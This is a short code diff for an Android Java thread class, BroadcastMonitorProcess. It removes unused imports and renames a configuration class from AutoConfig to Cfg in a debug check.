@@ -9,13 +9,8 @@
 
 package com.android.service.listener;
 
-import java.util.ArrayList;
-
-import android.app.ActivityManager.RunningAppProcessInfo;
-
 import com.android.service.RunningProcesses;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
@@ -45,7 +40,7 @@ public class BroadcastMonitorProcess extends Thread {
 			try {
 				wait(period);
 			} catch (InterruptedException e) {
-				if(AutoConfig.DEBUG) { e.printStackTrace(); }
+				if(Cfg.DEBUG) { e.printStackTrace(); }
 			}
 		} while (true);
 	}
